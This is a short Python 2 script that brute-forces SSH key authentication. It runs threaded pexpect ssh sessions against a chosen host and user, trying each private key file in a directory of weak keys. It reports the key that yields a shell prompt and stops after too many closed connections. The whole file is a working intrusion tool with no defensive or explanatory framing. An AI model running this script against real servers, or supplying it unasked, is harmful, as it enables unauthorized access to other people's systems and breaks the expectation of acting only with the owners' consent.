#!/usr/bin/python
# -*- coding: utf-8 -*-

import  optparse
from dummy_thread import exit

import pexpect
import os
import threading


maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(user, host, keyfile, release):
    global Stop,Fails
    try:
        perm_denied = 'Permission denied '
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connectStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connectStr)

        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
        # print(str(ret) + "=========" + str(child.match.group(0)))
        if ret == 2:
            print('[-] Adding Host to ∼/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage %prog -H <tgtHost> -u <user> -d <direction>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='user 用户')
    parser.add_option('-d', dest='direction', type='string', help='弱密钥 所在目录')


    (options,args) = parser.parse_args()
    tgtHost = options.tgtHost
    user = options.user
    direction = options.direction

    if tgtHost == None or user == None or direction == None:
        print options.usage
        exit(0)

    for fileName in os.listdir(direction):
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        if Fails > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)
        connection_lock.acquire()
        fullPath = os.path.join(direction,fileName)
        print('[-] Testing keyfile ' + str(fullPath))
        thread_temp = threading.Thread(target=connect, args=(user, tgtHost, fullPath, True))
        thread_temp.start()
if __name__ == '__main__':
    main()
